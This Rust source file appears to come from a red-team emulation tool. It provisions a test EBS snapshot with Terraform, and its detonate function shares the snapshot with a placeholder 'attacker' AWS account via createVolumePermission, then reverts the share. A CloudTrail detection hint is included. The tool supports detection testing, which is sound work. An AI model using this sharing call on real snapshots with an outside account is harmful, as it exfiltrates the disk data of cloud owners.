use std::collections::HashMap;
use std::sync::Arc;
use anyhow::Result;

use crate::platform::Platform;
use crate::providers::CloudProviders;
use crate::tactic::MitreTactic;
use crate::technique::{AttackTechnique, BoxFuture};

const TERRAFORM: &str = r#"
terraform {
  required_providers {
    aws    = { source = "hashicorp/aws",    version = "~> 5.0" }
    random = { source = "hashicorp/random", version = "~> 3.0" }
  }
}

resource "random_string" "suffix" {
  length  = 8
  special = false
  upper   = false
}

resource "aws_ebs_volume" "target" {
  availability_zone = data.aws_availability_zones.available.names[0]
  size              = 1

  tags = {
    Name = "stratus-red-team-ebs-${random_string.suffix.result}"
  }
}

resource "aws_ebs_snapshot" "target" {
  volume_id   = aws_ebs_volume.target.id
  description = "Stratus Red Team test snapshot"

  tags = {
    Name = "stratus-red-team-snapshot-${random_string.suffix.result}"
  }
}

data "aws_availability_zones" "available" {
  state = "available"
}

output "snapshot_id" {
  value = aws_ebs_snapshot.target.id
}
"#;

const ATTACKER_ACCOUNT_ID: &str = "012345678901";

async fn detonate_impl(outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> Result<()> {
    let aws = providers.aws().await?;
    let snapshot_id = outputs
        .get("snapshot_id")
        .ok_or_else(|| anyhow::anyhow!("missing output: snapshot_id"))?;

    aws.ec2
        .modify_snapshot_attribute()
        .snapshot_id(snapshot_id)
        .attribute(aws_sdk_ec2::types::SnapshotAttributeName::CreateVolumePermission)
        .operation_type(aws_sdk_ec2::types::OperationType::Add)
        .user_ids(ATTACKER_ACCOUNT_ID)
        .send()
        .await
        .map_err(|e| anyhow::anyhow!("{}", e))?;

    println!(
        "Shared EBS snapshot {} with attacker account {} via createVolumePermission.",
        snapshot_id, ATTACKER_ACCOUNT_ID
    );

    Ok(())
}

fn detonate(outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> BoxFuture<Result<()>> {
    Box::pin(detonate_impl(outputs, providers))
}

async fn revert_impl(outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> Result<()> {
    let aws = providers.aws().await?;
    let snapshot_id = outputs
        .get("snapshot_id")
        .ok_or_else(|| anyhow::anyhow!("missing output: snapshot_id"))?;

    aws.ec2
        .modify_snapshot_attribute()
        .snapshot_id(snapshot_id)
        .attribute(aws_sdk_ec2::types::SnapshotAttributeName::CreateVolumePermission)
        .operation_type(aws_sdk_ec2::types::OperationType::Remove)
        .user_ids(ATTACKER_ACCOUNT_ID)
        .send()
        .await
        .map_err(|e| anyhow::anyhow!("{}", e))?;

    println!(
        "Removed createVolumePermission for attacker account {} from snapshot {}.",
        ATTACKER_ACCOUNT_ID, snapshot_id
    );

    Ok(())
}

fn revert(outputs: HashMap<String, String>, providers: Arc<CloudProviders>) -> BoxFuture<Result<()>> {
    Box::pin(revert_impl(outputs, providers))
}

inventory::submit! {
    AttackTechnique {
        id: "aws.exfiltration.ec2-share-ebs-snapshot",
        friendly_name: "Exfiltrate EBS Snapshot by Sharing It",
        description: "Shares an EBS snapshot with an external attacker-controlled AWS account by granting createVolumePermission. Simulates data exfiltration where an attacker copies a disk snapshot to their own account.",
        detection: "CloudTrail: ModifySnapshotAttribute with createVolumePermission.",
        platform: Platform::Aws,
        mitre_tactics: &[MitreTactic::Exfiltration],
        is_idempotent: false,
        is_slow: false,
        prerequisite_tf: Some(TERRAFORM),
        detonate,
        revert: Some(revert),
    }
}
